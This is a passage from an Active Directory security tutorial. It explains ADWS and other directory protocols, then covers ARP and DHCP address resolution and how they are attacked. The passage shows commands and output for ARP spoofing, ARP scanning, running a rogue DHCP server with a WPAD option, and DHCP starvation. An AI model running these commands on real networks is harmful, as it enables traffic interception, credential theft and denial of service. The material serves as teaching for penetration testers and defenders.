<pre class="example">                              .---------------------------------------
                              |          Domain Controller
                            ,---
                            | 389 (Domain) &lt;------------.
                            '---                        |    .------.
                              |                         |----| LDAP |
                            .---                        |    '------'
                            | 3268 (Global Catalog) &lt;---'       |
                            '---                                ^
                              |                                 |
 .------.     .------.      .---                                |
 | ADWS |&gt;---&gt;| SOAP |&gt;----&gt;| 9389  &gt;-----------------&gt;---------'
 '------'     '------'      '---
                              |
                              '---------------------------------------
</pre>
<figcaption>
ADWS related ports and protocols
</figcaption>
</figure>
<p>
ADWS is the protocol used by the <a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=windowsserver2019-ps">ActiveDirectory Powershell module</a>.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Administrator&gt; Get-ADUser -Filter * | select name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>name
</span></span><span style="display:flex;"><span>----
</span></span><span style="display:flex;"><span>Administrator
</span></span><span style="display:flex;"><span>Guest
</span></span><span style="display:flex;"><span>krbtgt
</span></span><span style="display:flex;"><span>Anakin
</span></span><span style="display:flex;"><span>Han
</span></span><span style="display:flex;"><span>POKEMON$
</span></span><span style="display:flex;"><span>leia
</span></span><span style="display:flex;"><span>luke</span></span></code></pre></div>
</div>
<figcaption>
List users using ADWS
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-other-protocols" class="outline-4">
<h4 id="other-protocols">
Other protocols
</h4>
<div id="outline-text-other-protocols" class="outline-text-4">
<p>
Apart from LDAP and ADWS, there are many other protocols that allow to retrieve
information from the database. Although the rest of protocols, generally only
work with a subset with the database.</p>
<p>
The <a href="https://en.wikipedia.org/wiki/Domain_Name_System">DNS</a> protocol, used mostly to resolve the IP address of computers, also
retrieves its information from the database.</p>
<p>
The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/MS-SAMR/4df07fab-1bbc-452f-8e92-7853a3c7e380">SAMR</a> (Security Account Manager Remote) protocol allows to query and edit
basic info of the users and groups. Is the one used by commands such as
<code>net user /domain</code>.</p>
<p>
The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47">DRSR</a> (Directory Replication Service Remote) protocol is the one used by the
Domain Controllers to synchronize the database. Through this protocol even the
user credentials can be retrieved (if you have enough permissions) and is the
one used to perform the <a href="https://adsecurity.org/?p=1729">dcsync attack</a>.</p>
<p>
The <a href="https://www.tarlogic.com/en/blog/how-kerberos-works/">Kerberos</a> authentication protocol also uses the database to generate the
required tickets based on the requested service. Additionally, the kpasswd service
(port 464) is used by Kerberos to change the user password.</p>
<p>
The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f">Netlogon</a> protocol is used by computers in order to authenticate the domain
users. For example, is used by NTLM authentication. Also, this was the protocol
affected by the <a href="https://www.secura.com/blog/zero-logon">Zerologon</a> vulnerability.</p>
<p>
There are many other protocols that interacts with the database, but these short
list should give you the idea of there are many different ways to access to the
same data.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-security" class="outline-2">
<h2 id="security">
Security
</h2>
<div id="outline-text-security" class="outline-text-2">
<p>
Now that we have a more clear idea of the Active Directory elements, let's talk
about the topics that are more related with security in Active Directory.
Security is based on the following pillars: </p>
<dl>
<dt>
Address resolution
</dt>
<dd>The ability for users and machines to resolve addresses of
another computers in order to establish connections with them. If an attacker
can control the address resolutions, then she could perform Person in The Middle
attacks or make that users send their credentials to attacker controlled
machines.</dd>
<dt>
Authentication
</dt>
<dd>The ability to identify the user that is accessing to a
computer of service. If an attacker can get the user credentials or
authentication is bypassed, then she will be able to identify herself as the
user and perform actions on its behalf.</dd>
<dt>
Authorization
</dt>
<dd>The ability to identify what actions can be performed by an
user. If the user permissions are incorrectly configured, she may be able to
perform privileged actions.</dd>
</dl>
<p>Let's discuss about these fundamentals and how they are implemented in Active
Directory.</p>
</div>
</div>
<div id="outline-container-address-resolution" class="outline-2">
<h2 id="address-resolution">
Address resolution
</h2>
<div id="outline-text-address-resolution" class="outline-text-2">
<p>
From a security perspective, the resolution of address is quite relevant, since if
a user/program can be tricked into connecting to an erroneous machine, therefore
many attacks can be performed like:</p>
<ul>
<li>Person-in-The-Middle (PitM) : This allows an attacker to intercept the
communications of the victim and read/manipulate information (if it is not
properly encrypted/signed) sent or received by the victim.</li>
<li><a href="https://en.hackndo.com/ntlm-relay/">NTLM Relay</a>: An attacker can use an <a href="#ntlm">NTLM</a> authentication from the victim and
redirect it to a desired server in order to get access to it.</li>
<li><a href="https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html">NTLM crack</a>: Even if you are not able to relay the <a href="#NTLM">NTLM</a> authentication, you
can try to crack the NTLM hash and recover the user password.</li>
</ul>
<p>But, what addresses need to be resolved? There are three types of addresses that
are used by machines:</p>
<dl>
<dt>
MAC address
</dt>
<dd>
The <a href="https://en.wikipedia.org/wiki/MAC_address">MAC</a> (Media Control Access) is the address that uniquely identifies each
computer in the world (concretely each computer network card). The MAC address
is the one used to send messages in the Ethernet protocol, in the Link layer,
that <strong>communicates the computers in the same network</strong>. Each network card has
an associated unique MAC address that allows to identify it in a network.
Usually the MAC address remains constant, but <a href="https://www.howtogeek.com/192173/HOW-AND-WHY-TO-CHANGE-YOUR-MAC-ADDRESS-ON-WINDOWS-LINUX-AND-MAC/">it can be changed</a>.

A MAC address is composed by 6 bytes like <code class="verbatim">01:df:67:89:a4:87</code>, where the first
3 bytes indicates the <a href="https://gist.github.com/aallan/b4bb86db86079509e6159810ae9bd3e4">MAC vendor</a> and the last 3 are an unique identification
for each network card of that vendor.</dd>
<dt>
IP address
</dt>
<dd>
The <a href="https://en.wikipedia.org/wiki/IP_address">IP address</a> is the one used by the IP protocol, in the Internet layer, that
<strong>allows communication between computer of different networks</strong>. Unlike MAC
addresses, the IPs are not configured in the network cards but need to be set
by an external entity, by using a protocol like <a href="#dhcp">DHCP</a> or setting an static IP
address. So a computer can change its IP address at any time.

While traversing the networks, the IP addresses need to be mapped to MAC
addresses to allow communication inside of the different networks that 
route the packets. For this purpose, the <a href="#arp">ARP</a> protocol is used.

There are two versions of IP addresses, IPv4, that are composed by 4 bytes
(32 bits) like <code class="verbatim">23.78.167.99</code>,and IPv6, composed by 16 bytes like
<code class="verbatim">2001:db8:85a3:8d3:1319:8a2e:370:7348</code>. Usually IPv4 is used.</dd>
<dt>
Hostnames
</dt>
<dd>
Since IP addresses are hard to remember, computers are also assigned a name
that is more human-friendly like <code class="verbatim">pepe-machine</code>, known as hostname. However,
since computers need the IP address to communicate, it is possible to
associate the hostnames to IP addresses by using protocols like <a href="#dns">DNS</a>, <a href="#netbios">NetBIOS</a>,
<a href="#llmnr">LLMNR</a> or <a href="#mdns">mDNS</a>.</dd>
</dl>
<p>
Therefore, the following processes are vital for a computer to being able to
find the correct address to communicate:</p>
<dl>
<dt>
Hostname-IP resolution
</dt>
<dd>
<p>
The computers need to be able to map the hostname of a machine to its correct
IP address. For this purpose there are two strategies:</p>
<ol>
<li>Asking to a central server for the hostname resolution, which is the
approach used by <a href="#DNS">DNS</a>. If an attacker can become the central server, it can
map the hostnames to choose addresses.</li>
<li>Sending a broadcast request with the hostname to peers asking to the
computer with the given hostname to identify itself. This approach is used
by protocols like <a href="#netbios">NetBIOS</a>, <a href="#llmnr">LLMNR</a> or <a href="#mdns">mDNS</a>, where any computer in the network
can respond to the request, so an attacker could listen waiting for
requests and respond them identify itself as the target computer.</li>
</ol>
</dd>
<dt>
IP-MAC resolution
</dt>
<dd>
Once the IP is identified, the computers need to know to which computer
(network card) belongs that IP, so they ask for its MAC. For this they use the
<a href="#arp">ARP</a> protocol that works by sending a broadcast request to the internal network
and waiting to the correct host to identify itself. The attacker could respond
to the request identifying itself as the target to receive the connection.</dd>
<dt>
IP configuration
</dt>
<dd>
In order to use an IP and being able to find the central server to resolve
IPs, computers need to be configured. This configuration can be done manually
for each computer or it can be done by using a protocol like <a href="#dhcp">DHCP</a>, where a
server provides with configuration options to the computers of the network.

However, since computers don't have anything configured when they talk with
the DHCP server, they need to look blindly for it by sending broadcast
requests that any other machine can respond. So there is an opportunity for an
attacker to misconfigure it by responding to these requests and providing to the
client fake configuration parameters, usually pointing to a DNS server
controlled by the attacker.</dd>
</dl>
<p>
So, let's see how address resolution can be attacked in Active Directory and
other computer networks.</p>
<div id="outline-container-arp" class="outline-3">
<h3 id="arp">
ARP
</h3>
<div id="outline-text-arp" class="outline-text-3">
<p>
<a href="https://en.wikipedia.org/wiki/Address_Resolution_Protocol">ARP</a> (Address Resolution Protocol) is a link layer protocol heavily used in
network that allows to map the relation between the IP address of a computer and
its MAC (Media Access Control) address. </p>
<p>
In order to do that, the client machine sends an Ethernet broadcast ARP request
to the local network, asking for the one that has the target IP address. Then
the computer with that IP should respond identifying its MAC. Finally the client
sends the application packets to that Ethernet address. </p>
<figure>
<pre class="example">                                                   .---.
                                                  /   /|
                                                 .---. |
                                       .-------&gt; |   | '
                                       |         |   |/ 
                                       |         '---'  
   .---.                               |
  /   /|                               |           .---.
 .---. |    1) Who is 192.168.1.5?     |          /   /|
 |   | ' &gt;--------&gt;&gt;-------------------.-------&gt; .---. |
 |   |/                                |         |   | '
 '---'   &lt;---------.                   |         |   |/ 
                   |                   |         '---'  
                   |                   |
                   |                   |           .---.
                   |                   |          /   /|
                   |                   '-------&gt; .---. |
                   |                             |   | '
                   '-&lt;&lt;------------------------&lt; |   |/ 
                     2)  I am 192.168.1.5        '---'  
                      (MAC 01:02:03:04:05:06)
</pre>
<figcaption>
ARP resolution
</figcaption>
</figure>
<div id="outline-container-arp-spoof" class="outline-4">
<h4 id="arp-spoof">
ARP spoof
</h4>
<div id="outline-text-arp-spoof" class="outline-text-4">
<p>
Even if usually is the correct computer the one that respond to the ARP request,
it is possible for any computer to respond to it. So, an attacker could respond
to all the ARP requests trying to impersonate other computers.</p>
<p>
However, computers do not perform a ARP request any time they need to
communicate with the target, but they keep the previous responses in a local ARP
cache.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ arp -n
</span></span><span style="display:flex;"><span>Address                  HWtype  HWaddress           Flags Mask            Iface
</span></span><span style="display:flex;"><span>192.168.1.101            ether   e4:fd:a1:09:bf:a1   C                     wlp1s0
</span></span><span style="display:flex;"><span>192.168.1.1              ether   00:e0:4c:d8:ca:89   C                     wlp1s0</span></span></code></pre></div>
</div>
<figcaption>
Show the ARP cache
</figcaption>
</figure>
<p>
By keeping the ARP cache, computers reduce the number of request that it needs
to perform. However, computers also listen ARP responses for changes without
performing requests, so an attacker could send periodic replies in order to
poison the victim ARP cache.</p>
<figure>
<pre class="example">        1)  I am 192.168.1.1           1)    I am 192.168.1.101    
         (MAC de:ad:be:ef:13:37)        (MAC de:ad:be:ef:13:37)
     .--------------&lt;&lt;&lt;------------. .-------------&gt;&gt;&gt;---------------.
     |                             | |                               |
     v                             ^ ^                               v
   .---.   2) To 192.168.1.1      .---.   3) To 192.168.1.1        .---.
  /   /| --------&gt;&gt;&gt;---------&gt;   /   /| --------&gt;&gt;&gt;------------&gt;  /   /|
 .---. |                        .---. |                          .---. |
 |   | '   5) To 192.168.1.101  |   | '   4) To 192.168.1.101    |   | '
 |   |/  &lt;-------&lt;&lt;&lt;----------  |   |/  &lt;-------&lt;&lt;&lt;------------- |   |/ 
 '---'                          '---'                            '---'  
192.168.1.101                   192.168.1.137                   192.168.1.1
e4:fd:a1:09:bf:a1            de:ad:be:ef:13:37              00:e0:4c:d8:ca:89
</pre>
<figcaption>
ARP spoof attack
</figcaption>
</figure>
<p>
You can perform an ARP spoofing/poisoning attack with tools like <a href="https://www.ettercap-project.org/">ettercap</a>,
<a href="https://github.com/bettercap/bettercap">bettercap</a>, <a href="https://github.com/smikims/arpspoof">arpspoof</a> or <a href="https://github.com/Zer1t0/arplayer">arplayer</a>.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ ./arplayer spoof -I wlp1s0 -vvv -F -b 192.168.1.101 192.168.1.1
</span></span><span style="display:flex;"><span>Spoofing - telling 192.168.1.101 (e4:fd:a1:09:bf:a1) that 192.168.1.1 is 00:e0:4c:d8:ca:89 (192.168.1.107) every 1.0 seconds (until Ctrl-C)
</span></span><span style="display:flex;"><span>INFO - 192.168.1.1-de:ad:be:ef:13:37 -&gt; 192.168.1.101-e4:fd:a1:09:bf:a1
</span></span><span style="display:flex;"><span>INFO - 192.168.1.101-de:ad:be:ef:13:37 -&gt; 192.168.1.1-00:e0:4c:d8:ca:89
</span></span><span style="display:flex;"><span>INFO - 192.168.1.1-de:ad:be:ef:13:37 -&gt; 192.168.1.101-e4:fd:a1:09:bf:a1
</span></span><span style="display:flex;"><span>INFO - 192.168.1.101-de:ad:be:ef:13:37 -&gt; 192.168.1.1-00:e0:4c:d8:ca:89
</span></span><span style="display:flex;"><span>INFO - 192.168.1.1-de:ad:be:ef:13:37 -&gt; 192.168.1.101-e4:fd:a1:09:bf:a1
</span></span><span style="display:flex;"><span>INFO - 192.168.1.101-de:ad:be:ef:13:37 -&gt; 192.168.1.1-00:e0:4c:d8:ca:89</span></span></code></pre></div>
</div>
<figcaption>
ARP spoof attack with arplayer
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-arp-scan" class="outline-4">
<h4 id="arp-scan">
ARP Scan
</h4>
<div id="outline-text-arp-scan" class="outline-text-4">
<p>
Other interesting possibility using ARP is to request all the IPs in the network
in order to check the ARP responses and discover what hosts are active. This
technique is known as ARP scan.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ ./arplayer scan -I wlp1s0 -w 10 -t 1000
</span></span><span style="display:flex;"><span>192.168.1.1 00:e0:4c:d8:ca:89
</span></span><span style="display:flex;"><span>192.168.1.101 e4:fd:a1:09:bf:a1</span></span></code></pre></div>
</div>
<figcaption>
ARP scan
</figcaption>
</figure>
</div>
</div>
</div>
</div>
<div id="outline-container-dhcp" class="outline-3">
<h3 id="dhcp">
DHCP
</h3>
<div id="outline-text-dhcp" class="outline-text-3">
<p>
DHCP (Dynamic Host Configuration Protocol) is a protocol that helps to configure
dynamic IP addresses for the computers of a network. It is an application
protocol that works over UDP. It uses the port 67/UDP in the server and requires
the client to send the messages from the port 68/UDP.</p>
<figure>
<pre class="example"> client                         server
 -----.                        .-----
      |                        |
     ---.      .------.      .---
 68/UDP |&gt;----&gt;| DHCP |&gt;----&gt;| 67/UDP
     ---'      '------'      '---
      |                        |
 -----'                        '-----
</pre>
<figcaption>
DHCP ports
</figcaption>
</figure>
<p>
In DHCP, the new clients of the network search for the DHCP server to get a correct
configuration that allows them to interact with the rest of the network. This
process of configuration is divided in four phases:</p>
<ol>
<li><strong>Server discovery</strong>: The client asks for a IP address by sending a broadcast
message, to the 255.255.255.255 address or the network broadcast address, in
order to reach the DHCP server.</li>
<li><strong>IP lease offer</strong>: The server answers (also to broadcast) with an IP
address that offers to the client, as well as other configuration options. </li>
<li><strong>IP lease request</strong>: The client receives the offered IP and sends a message
to request it.</li>
<li><strong>IP lease acknowledge</strong>: The server confirms that the client can use the
choosen IP address. Also, it includes several configuration options like the
IP renewal time.</li>
</ol>
<p>This phases are usually abreviated as DORA (Discovery, Offer, Request,
Acknowledge) and are triggered when a computer joins to a network. DHCP
configuration can also be triggered manually with the <code>dhclient</code> command in
Linux and <code>ipconfig /renew</code> in Windows.</p>
<figure>
<pre class="example">  client        server
    |             |
    |  discovery  |
    | ----------&gt; |
    |             |
    |    offer    |
    | &lt;---------- |
    |             |
    |   request   |
    | ----------&gt; |
    |             |
    | acknowledge |
    | &lt;---------- |
    |             |
</pre>
<figcaption>
DHCP phases
</figcaption>
</figure>
<p>
Between the <a href="https://linux.die.net/man/5/dhcp-options">many configuration options</a>, the following can be interesting:</p>
<figure>
<table>
<thead>
<tr>
<th class="align-right">Code</th>
<th>Name</th>
</tr>
</thead>
<tbody>
<tr>
<td class="align-right">3</td>
<td>Gateway IP (Router)</td>
</tr>
<tr>
<td class="align-right">6</td>
<td>DNS server IP</td>
</tr>
<tr>
<td class="align-right">15</td>
<td>Domain name</td>
</tr>
<tr>
<td class="align-right">44</td>
<td>NetBIOS name (WINS) server IP</td>
</tr>
<tr>
<td class="align-right">54</td>
<td>DHCP server IP</td>
</tr>
<tr>
<td class="align-right">252</td>
<td>WPAD configuration file</td>
</tr>
</tbody>
</table>
<figcaption>
DHCP options
</figcaption>
</figure>
<p>
In order to check the options provided by the network DHCP server, in Windows you can
examinate the configuration of your network interface (if its configured to use
DHCP) with <code>ipconfig /all</code>. However, in Linux, different DHCP options configure
different files, for example, to check the DNS server, you should check
<code class="verbatim">/etc/resolv.conf</code> file, or use <code>ip route</code> to get the default gateway.</p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\Anakin<span style="color:#75715e">&gt;ipconfig /all</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows IP Configuration
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Host Name . . . . . . . . . . . . : ws01-10
</span></span><span style="display:flex;"><span>   Primary Dns Suffix  . . . . . . . : contoso.local
</span></span><span style="display:flex;"><span>   Node Type . . . . . . . . . . . . : Hybrid
</span></span><span style="display:flex;"><span>   IP Routing Enabled. . . . . . . . : No
</span></span><span style="display:flex;"><span>   WINS Proxy Enabled. . . . . . . . : No
</span></span><span style="display:flex;"><span>   DNS Suffix Search List. . . . . . : contoso.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ethernet adapter Ethernet:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Connection-specific DNS Suffix  . : contoso.local
</span></span><span style="display:flex;"><span>   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection #2
</span></span><span style="display:flex;"><span>   Physical Address. . . . . . . . . : 52-54-00-76-87-BB
</span></span><span style="display:flex;"><span>   DHCP Enabled. . . . . . . . . . . : Yes
</span></span><span style="display:flex;"><span>   Autoconfiguration Enabled . . . . : Yes
</span></span><span style="display:flex;"><span>   IPv4 Address. . . . . . . . . . . : 192.168.100.3(Preferred)
</span></span><span style="display:flex;"><span>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span style="display:flex;"><span>   Lease Obtained. . . . . . . . . . : 30 November 2020 12:20:13
</span></span><span style="display:flex;"><span>   Lease Expires . . . . . . . . . . : 08 December 2020 20:20:13
</span></span><span style="display:flex;"><span>   Default Gateway . . . . . . . . . : 192.168.100.2
</span></span><span style="display:flex;"><span>   DHCP Server . . . . . . . . . . . : 192.168.100.2
</span></span><span style="display:flex;"><span>   DNS Servers . . . . . . . . . . . : 192.168.100.2
</span></span><span style="display:flex;"><span>   Primary WINS Server . . . . . . . : 192.168.100.2
</span></span><span style="display:flex;"><span>   NetBIOS over Tcpip. . . . . . . . : Disabled</span></span></code></pre></div>
</div>
<figcaption>
Windows network interface options
</figcaption>
</figure>
<p>
Additionally, you can check the options provided by the DHCP server
with <a href="https://github.com/Zer1t0/dhcplayer#dhcp-server">dhcplayer</a> or the nmap script <a href="https://nmap.org/nsedoc/scripts/broadcast-dhcp-discover.html">broadcast-dhcp-discover</a>. However, root/admin
privileges are required since source port 68 needs to be used.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@debian10:~# nmap --script broadcast-dhcp-discover -e enp7s0
</span></span><span style="display:flex;"><span>Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-30 05:55 EST
</span></span><span style="display:flex;"><span>Pre-scan script results:
</span></span><span style="display:flex;"><span>| broadcast-dhcp-discover: 
</span></span><span style="display:flex;"><span>|   Response 1 of 1: 
</span></span><span style="display:flex;"><span>|     IP Offered: 192.168.100.7
</span></span><span style="display:flex;"><span>|     DHCP Message Type: DHCPOFFER
</span></span><span style="display:flex;"><span>|     Subnet Mask: 255.255.255.0
</span></span><span style="display:flex;"><span>|     Renewal Time Value: 4d00h00m00s
</span></span><span style="display:flex;"><span>|     Rebinding Time Value: 7d00h00m00s
</span></span><span style="display:flex;"><span>|     IP Address Lease Time: 8d00h00m00s
</span></span><span style="display:flex;"><span>|     Server Identifier: 192.168.100.2
</span></span><span style="display:flex;"><span>|     WPAD: http://isalocal.contoso.local:80/wpad.dat\x00
</span></span><span style="display:flex;"><span>|     Router: 192.168.100.2
</span></span><span style="display:flex;"><span>|     Name Server: 192.168.100.2
</span></span><span style="display:flex;"><span>|     Domain Name Server: 192.168.100.2
</span></span><span style="display:flex;"><span>|     Domain Name: contoso.local\x00
</span></span><span style="display:flex;"><span>|_    NetBIOS Name Server: 192.168.100.2
</span></span><span style="display:flex;"><span>WARNING: No targets were specified, so 0 hosts scanned.
</span></span><span style="display:flex;"><span>Nmap done: 0 IP addresses (0 hosts up) scanned in 0.52 seconds</span></span></code></pre></div>
</div>
<figcaption>
DHCP options enumeration with nmap
</figcaption>
</figure>
<p>
Apart from enumeration, the DHCP protocol can also be abused to perform a couple
of attacks: </p>
<ul>
<li>DHCP starvation/exhaustion</li>
<li>Rogue DHCP server</li>
</ul>
<p>Let's see how they work.</p>
<div id="outline-container-rogue-dhcp-server" class="outline-4">
<h4 id="rogue-dhcp-server">
Rogue DHCP server
</h4>
<div id="outline-text-rogue-dhcp-server" class="outline-text-4">
<p>
Due to the descentralized nature of DHCP, any
machine in the network can take the role of a DHCP server by answering to the
client discovery/request messages. Therefore, an attacker could create a rogue
DHCP server in order to set a custom configuration in the clients.</p>
<p>
Between the options that are configured by a DHCP server are the following:</p>
<ul>
<li>Gateway/router</li>
<li>DNS servers</li>
<li>NetBIOS/WINS name servers</li>
<li>WPAD</li>
</ul>
<p>In this way, clients could be, among others things, misconfigured to send DNS
request to a rogue DNS server, that could redirect them to fake computers or
domains controlled by the attacker.  In order to perform this kind of attack, it
is possible to use tools like <a href="https://github.com/tomac/yersinia">yersinia</a> or <a href="https://github.com/Zer1t0/dhcplayer#dhcp-server">dhcplayer</a>.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ dhcplayer server -I eth2 --wpad http://here.contoso.local/wpad.dat -v --domain contoso.local          
</span></span><span style="display:flex;"><span>INFO - IP pool: 192.168.100.1-192.168.100.254
</span></span><span style="display:flex;"><span>INFO - Mask: 255.255.255.0
</span></span><span style="display:flex;"><span>INFO - Broadcast: 192.168.100.255
</span></span><span style="display:flex;"><span>INFO - DHCP: 192.168.100.44
</span></span><span style="display:flex;"><span>INFO - DNS: [192.168.100.44]
</span></span><span style="display:flex;"><span>INFO - Router: [192.168.100.44]
</span></span><span style="display:flex;"><span>INFO - WPAD: http://here.contoso.local/wpad.dat
</span></span><span style="display:flex;"><span>INFO - Domain: contoso.local
</span></span><span style="display:flex;"><span>INFO - REQUEST from 52:54:00:5d:56:b9 (debian10)
</span></span><span style="display:flex;"><span>INFO - Requested IP 192.168.100.145
</span></span><span style="display:flex;"><span>INFO - ACK to 192.168.100.145 for 52:54:00:5d:56:b9
</span></span><span style="display:flex;"><span>INFO - REQUEST from 52:54:00:76:87:bb (ws01-10)
</span></span><span style="display:flex;"><span>INFO - Requested IP 192.168.100.160
</span></span><span style="display:flex;"><span>INFO - ACK to 192.168.100.160 for 52:54:00:76:87:bb</span></span></code></pre></div>
</div>
<figcaption>
(rogue) DHCP server with dhcplayer
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-dhcp-starvation" class="outline-4">
<h4 id="dhcp-starvation">
DHCP Starvation
</h4>
<div id="outline-text-dhcp-starvation" class="outline-text-4">
<p>
The DHCP starvation attack is a DOS attacks where a fake client requests all
available IP addresses that a DHCP server offers. This way, the legitimate clients
cannot obtain an IP address so must stay offline. It is possible to perform this
attack by using tools like <a href="https://github.com/sgeto/dhcpstarv">dhcpstarv</a>, <a href="https://github.com/tomac/yersinia">yersinia</a> or <a href="https://github.com/Zer1t0/dhcplayer#starvation-attack">dhcplayer</a>.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ dhcpstarv -i enp7s0
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.7 <span style="color:#66d9ef">for</span> 00:16:36:99:be:21 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.8 <span style="color:#66d9ef">for</span> 00:16:36:25:1f:1d from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.9 <span style="color:#66d9ef">for</span> 00:16:36:c7:79:f2 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.10 <span style="color:#66d9ef">for</span> 00:16:36:f4:c3:e9 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.11 <span style="color:#66d9ef">for</span> 00:16:36:dc:51:a1 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.12 <span style="color:#66d9ef">for</span> 00:16:36:c2:c2:06 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.13 <span style="color:#66d9ef">for</span> 00:16:36:15:e0:74 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.14 <span style="color:#66d9ef">for</span> 00:16:36:40:1c:02 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.15 <span style="color:#66d9ef">for</span> 00:16:36:c5:9a:c3 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.16 <span style="color:#66d9ef">for</span> 00:16:36:14:1a:b3 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.17 <span style="color:#66d9ef">for</span> 00:16:36:13:45:14 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.18 <span style="color:#66d9ef">for</span> 00:16:36:14:fb:18 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.19 <span style="color:#66d9ef">for</span> 00:16:36:b2:93:90 from 192.168.100.2
</span></span><span style="display:flex;"><span>08:03:09 11/30/20: got address 192.168.100.20 <span style="color:#66d9ef">for</span> 00:16:36:c7:38:f9 from 192.168.100.2</span></span></code></pre></div>
</div>
<figcaption>
DHCP starvation attack with dhcpstarv
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-dhcp-discovery" class="outline-4">
<h4 id="dhcp-discovery">
DHCP Discovery
</h4>
<div id="outline-text-dhcp-discovery" class="outline-text-4">
<p>
Also DHCP can be interesting from the client point of view, since it could allow
you to get some useful information about the environment, that what it is designed
for.</p>
<p>
You can sent a DISCOVER to message to the network and check what information is
retrieved. Is a way to get information from an unauthenticated position, like
the domain or the servers addresses, which usually are the Domain Controllers.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ dhcplayer discover -I eth2 -n
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OFFER received from 192.168.100.2
</span></span><span style="display:flex;"><span>Offered IP: 192.168.100.3
</span></span><span style="display:flex;"><span>Client MAC: 52:54:00:88:80:0c
</span></span><span style="display:flex;"><span>DHCP Server: 192.168.100.2
</span></span><span style="display:flex;"><span>Options:
</span></span><span style="display:flex;"><span>[1] Subnet Mask: 255.255.255.0
</span></span><span style="display:flex;"><span>[58] Renewal Time: 345600
</span></span><span style="display:flex;"><span>[59] Rebinding Time: 604800
</span></span><span style="display:flex;"><span>[51] IP Address Lease Time: 691200
</span></span><span style="display:flex;"><span>[54] DHCP Server ID: 192.168.100.2
</span></span><span style="display:flex;"><span>[3] Router: 192.168.100.2
</span></span><span style="display:flex;"><span>[5] Name Server: 192.168.100.2
</span></span><span style="display:flex;"><span>[6] Domain Server: 192.168.100.2
</span></span><span style="display:flex;"><span>[15] Domain Name: contoso.local
</span></span><span style="display:flex;"><span>[44] NetBIOS Name Server: 192.168.100.2
